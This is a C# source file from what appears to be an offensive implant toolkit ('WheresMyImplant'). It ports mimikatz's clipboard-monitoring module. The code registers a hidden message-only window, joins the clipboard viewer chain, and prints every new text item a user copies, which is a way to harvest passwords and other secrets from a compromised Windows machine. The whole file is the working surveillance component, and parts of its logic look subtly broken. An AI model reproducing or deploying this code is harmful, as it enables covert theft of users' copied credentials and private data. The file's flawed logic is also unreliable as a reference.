using System;
using System.Linq;
using System.Runtime.InteropServices;

using Unmanaged.Headers;
using Unmanaged.Libraries;

namespace WheresMyImplant
{
    //https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/kuhl_m_misc.c
    sealed class Clipboard : Base, IDisposable
    {
        private const String szName = "ClippyClipClip";

        private static IntPtr hInstance;
        private static IntPtr hWndClipboard;
        private static IntPtr hWndViewer;
        private static IntPtr hClipboardData;

        private static GCHandle gcParam;

        private static UInt16 lpClassName;

        private static IntPtr data;
        private static UInt32 dwData;
        private static UInt32 sequenceNumber;

        private delegate IntPtr lpfnWndProcDelegate(IntPtr hwnd, UInt32 uMsg, IntPtr wParam, String lParam);

        public Clipboard()
        {
            hInstance = kernel32.GetModuleHandle(String.Empty);

            data = IntPtr.Zero;
            dwData = 0;
            sequenceNumber = 0;
        }

        public void Monitor()
        {
            lpfnWndProcDelegate lpfnWndProc = FnWndProc;
            Winuser.WNDCLASSEX lpwcx = Winuser.WNDCLASSEX.Build();
            lpwcx.lpfnWndProc = lpfnWndProc;
            lpwcx.lpszClassName = szName;

            lpClassName = user32.RegisterClassEx(ref lpwcx); 
            if (0 == lpClassName)
            {
                Console.WriteLine("[-] {0} 0x{1:X}", "RegisterClassEx Failed", Marshal.GetLastWin32Error());
                Console.WriteLine("[-] {0}\n", new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error()).Message);
                return;
            }
            
            hWndClipboard = user32.CreateWindowEx(
                Winuser.WindowStylesEx.WS_EX_RIGHTSCROLLBAR, 
                new IntPtr((Int32)lpClassName), 
                "Monitor", 0, 0, 0, 0, 0, Winuser.HWND_MESSAGE, IntPtr.Zero, hInstance, IntPtr.Zero);
            if (IntPtr.Zero == hWndClipboard)
            {
                Console.WriteLine("[-] {0} 0x{1:X}", "CreateWindowEx Failed", Marshal.GetLastWin32Error());
                Console.WriteLine("[-] {0}\n", new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error()).Message);
                return;
            }
            
            kernel32.SetConsoleCtrlHandler(new kernel32.HandlerRoutine(HandlerRoutine), true);
            

            hWndViewer = user32.SetClipboardViewer(hWndClipboard);
            Winuser.tagMSG lpMsg= new Winuser.tagMSG();
            while (user32.GetMessage(ref lpMsg, hWndViewer, Winuser.WM_QUIT, Winuser.WM_CHANGECBCHAIN))
            {
                user32.TranslateMessage(ref lpMsg);
                user32.DispatchMessage(ref lpMsg);
            }

            if (!user32.ChangeClipboardChain(hWndClipboard, hWndViewer))
            {
                Console.WriteLine("ChangeClipboardChain Failed");
                return;
            }

            kernel32.SetConsoleCtrlHandler(new kernel32.HandlerRoutine(HandlerRoutine), false);
        }

        public static Boolean HandlerRoutine(Wincon.CtrlType dwCtrlType)
        {
            if (IntPtr.Zero != hClipboardData)
            {
                kernel32.LocalFree(hClipboardData);
            }

            if (IntPtr.Zero != hWndClipboard)
            {
                user32.PostMessage(hWndClipboard, Winuser.WM_QUIT, 0x00000080, 0);
            }

            switch (dwCtrlType)
            {
                case Wincon.CtrlType.CTRL_C_EVENT:
                    return true;
                case Wincon.CtrlType.CTRL_BREAK_EVENT:
                    return true;
                case Wincon.CtrlType.CTRL_CLOSE_EVENT:
                    return false;
                case Wincon.CtrlType.CTRL_LOGOFF_EVENT:
                    return false;
                case Wincon.CtrlType.CTRL_SHUTDOWN_EVENT:
                    return false;
                default:
                    return false;
            }
        }

        public IntPtr FnWndProc(IntPtr hwnd, UInt32 uMsg, IntPtr wParam, String lParam)
        {
            IntPtr result = IntPtr.Zero;

            switch(uMsg)
            {
                case Winuser.WM_CHANGECBCHAIN:
                    if (hWndViewer == wParam)
                    {
                        /*
                        if (gcParam.IsAllocated)
                        {
                            gcParam.Free();
                        }
                        */
                        gcParam = GCHandle.Alloc(lParam, GCHandleType.Pinned);

                        hWndViewer = gcParam.AddrOfPinnedObject();
                    }
                    else if (IntPtr.Zero != hWndViewer)
                    {
                        result = user32.SendMessage(hWndViewer, uMsg, wParam, lParam);
                    }
                    break;
                case Winuser.WM_DRAWCLIPBOARD:
                    UInt32 current = user32.GetClipboardSequenceNumber();
                    if (sequenceNumber != current)
                    {
                        sequenceNumber = current;
                        if (!user32.OpenClipboard(hwnd))
                        {
                            UInt32 bestFormat = 0;
                            for (UInt32 format = user32.EnumClipboardFormats(0); format != 0 && (bestFormat != (UInt32)Winuser.ClipboardFormats.CF_UNICODETEXT); format = user32.EnumClipboardFormats(format))
                            {
                                if (format == (UInt32)Winuser.ClipboardFormats.CF_TEXT || format == (UInt32)Winuser.ClipboardFormats.CF_UNICODETEXT)
                                {
                                    if (format > bestFormat)
                                    {
                                        bestFormat = format;
                                    }
                                }
                            }

                            if (0 != bestFormat)
                            {
                                IntPtr hData = user32.GetClipboardData(bestFormat);
                                if (IntPtr.Zero != hData)
                                {
                                    UInt32 size = kernel32.GlobalSize(hData);
                                    if (0 != size)
                                    {
                                        Boolean sameData = false;
                                        Boolean samesize = (size == dwData);
                                        if (samesize && IntPtr.Zero != data)
                                        {
                                            Byte[] data1 = new Byte[size];
                                            Byte[] data2 = new Byte[size];
                                            Marshal.Copy(data, data1, 0, (Int32)size);
                                            Marshal.Copy(hData, data2, 0, (Int32)size);
                                            sameData = data1.SequenceEqual<Byte>(data2);
                                        }

                                        if (!samesize)
                                        {
                                            if (IntPtr.Zero != data)
                                            {
                                                kernel32.LocalFree(data);
                                                data = IntPtr.Zero;
                                                dwData = 0;
                                            }
                                            data = Marshal.AllocHGlobal((Int32)size);
                                            dwData = size;
                                        }

                                        if (!sameData && (IntPtr.Zero != data))
                                        {
                                            data = hData;
                                            Console.WriteLine("Data: {0}", Marshal.PtrToStringAuto(data));
                                        }
                                    }
                                }
                                else
                                {
                                    Console.WriteLine("GetClipboardData");
                                }
                            }
                            user32.CloseClipboard();
                        }
                    }
                    result = user32.SendMessage(hWndViewer, uMsg, wParam, lParam);
                    break;
                default:
                    result = user32.DefWindowProcW(hwnd, uMsg, wParam, lParam);
                    break;
            }
            return result;
        }

        ~Clipboard()
        {
            Dispose();
        }

        public void Dispose()
        {
            if (!user32.DestroyWindow(hWndClipboard))
            {
                Console.WriteLine("DestroyWindow Failed");
            }

            if (!user32.UnregisterClass(Convert.ToString(lpClassName), hInstance))
            {
                Console.WriteLine("UnregisterClass Failed");
            }

            if (gcParam.IsAllocated)
            {
                gcParam.Free();
            }
        }
    }
}